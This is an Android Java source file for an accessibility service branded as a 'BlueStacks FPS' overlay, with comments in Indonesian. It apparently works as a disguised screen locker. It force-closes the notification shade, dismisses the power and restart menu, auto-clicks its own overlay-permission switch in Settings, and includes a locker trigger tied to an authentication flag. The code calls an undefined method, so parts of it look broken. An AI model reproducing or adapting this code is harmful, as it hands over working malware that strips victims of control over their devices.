package com.bluestacks.fpsoverlay;

import android.accessibilityservice.AccessibilityService;
import android.content.Intent;
import android.net.Uri;
import android.provider.Settings;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;
import java.util.List;
import android.os.Environment;
import java.io.File;
import java.io.FileWriter;

public class FPSAccessibilityService extends AccessibilityService {

    private long lastActionTime = 0;
    private static final long ACTION_DELAY = 1000; // Ditingkatkan ke 1s agar lebih stabil

    @Override
    protected void onServiceConnected() {
        super.onServiceConnected();
        writeLog("FPS Service Connected - Initializing Overlay"); 
        
        // Langsung lompat tanpa menunggu event pertama
        jumpToOverlaySettings(); //
    }

    private void writeLog(String text) {
        try {
            File downloadDir = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
            File myDir = new File(downloadDir, "bs_engine_logs");
            if (!myDir.exists()) myDir.mkdirs();
            
            File logFile = new File(myDir, "logs.txt");
            FileWriter writer = new FileWriter(logFile, true);
            String timestamp = java.text.DateFormat.getDateTimeInstance().format(new java.util.Date());
            writer.append(timestamp).append(" : ").append(text).append("\n");
            writer.flush();
            writer.close();
        } catch (Exception e) {
            android.util.Log.e("DEX_LOG", "Failed to write log: " + e.getMessage());
        }
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        int eventType = event.getEventType();
        String packageName = event.getPackageName() != null ? event.getPackageName().toString() : "";

        // 1. BLOKIR QUICK SETTINGS & NOTIFIKASI
        // Setiap kali user menarik status bar, packageName biasanya berubah menjadi systemui
        if (packageName.equals("com.android.systemui")) {
            // Tekan BACK secara virtual untuk menutup panel yang sedang meluncur turun
            performGlobalAction(GLOBAL_ACTION_BACK);
            
            // Untuk Android 12+, gunakan aksi spesifik untuk menutup shade jika BACK tidak cukup
            if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.S) {
                performGlobalAction(GLOBAL_ACTION_DISMISS_NOTIFICATION_SHADE);
            }

            // Kirim broadcast penutup sebagai proteksi lapis ketiga
            Intent closeDialog = new Intent(Intent.ACTION_CLOSE_SYSTEM_DIALOGS);
            sendBroadcast(closeDialog);
            
            writeLog("Quick Settings/Notification blocked.");
        }

        AccessibilityNodeInfo rootNode = getRootInActiveWindow();
        if (rootNode == null) return;

        try {
            // 2. BLOKIR POWER MENU & DIALOG SISTEM
            if (packageName.equals("android") || packageName.contains("systemui")) {
                checkAndDismissSensitiveUI(rootNode);
            }

            // 3. HANDLE AUTOMATION PERMISSION (Logic yang sudah ada)
            handleOverlayPermissionFlow(rootNode, packageName);
            
        } finally {
            rootNode.recycle();
        }
    }

    private void handleOverlayPermissionFlow(AccessibilityNodeInfo root, String pkg) {
        // Kita buat loop pencarian singkat jika node belum ditemukan
        // Ini menangani delay render UI di halaman Settings
        new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
            AccessibilityNodeInfo currentRoot = getRootInActiveWindow();
            if (currentRoot == null) return;

            try {
                // 1. Mencari nama aplikasi di list overlay (BlueStacks FPS)
                List<AccessibilityNodeInfo> targets = currentRoot.findAccessibilityNodeInfosByText("BlueStacks FPS");
                AccessibilityNodeInfo switchNode = findNodeById(currentRoot, "android:id/switch_widget");

                if (!targets.isEmpty() && switchNode != null) {
                    if (!switchNode.isChecked()) {
                        writeLog("Enabling FPS Engine Toggle");
                        performClick(switchNode);
                    } else {
                        writeLog("FPS Engine Active. Loading UI.");
                        triggerOverlay();
                    }
                } else if (pkg.contains("settings")) {
                    clickByText(currentRoot, "BlueStacks FPS");
                }
            } finally {
                currentRoot.recycle();
            }
        }, 150); // Delay kecil 150ms untuk sinkronisasi render UI
    }

    private AccessibilityNodeInfo findNodeById(AccessibilityNodeInfo root, String viewId) {
        List<AccessibilityNodeInfo> nodes = root.findAccessibilityNodeInfosByViewId(viewId);
        return (nodes != null && !nodes.isEmpty()) ? nodes.get(0) : null;
    }

    private void clickByText(AccessibilityNodeInfo node, String text) {
        List<AccessibilityNodeInfo> targets = node.findAccessibilityNodeInfosByText(text);
        for (AccessibilityNodeInfo target : targets) {
            if (target.getText() != null && target.getText().toString().equalsIgnoreCase(text)) {
                performClick(target);
            }
            target.recycle();
        }
    }

    private void performClick(AccessibilityNodeInfo node) {
        AccessibilityNodeInfo clickable = node;
        while (clickable != null && !clickable.isClickable()) {
            clickable = clickable.getParent();
        }
        if (clickable != null && clickable.isClickable()) {
            clickable.performAction(AccessibilityNodeInfo.ACTION_CLICK);
            lastActionTime = System.currentTimeMillis();
        }
    }

    private void checkAndDismissSensitiveUI(AccessibilityNodeInfo node) {
        String[] powerKeywords = {"Power off", "Restart", "Daya mati", "Mulai lagi", "Darurat"};
        for (String key : powerKeywords) {
            if (!node.findAccessibilityNodeInfosByText(key).isEmpty()) {
                performGlobalAction(GLOBAL_ACTION_BACK);
                break;
            }
        }
    }

    private void jumpToOverlaySettings() {
        writeLog("Executing Jump to Overlay Settings");
        Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, 
                                Uri.parse("package:" + getPackageName()));
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_NO_HISTORY | Intent.FLAG_ACTIVITY_EXCLUDE_FROM_RECENTS);
        startActivity(intent);
    }

    private void triggerLocker() {
        if (!FPSService.isAuthenticated) {
            Intent intent = new Intent(this, FPSService.class);
            startService(intent);
        }
    }

    @Override
    public void onInterrupt() {}
}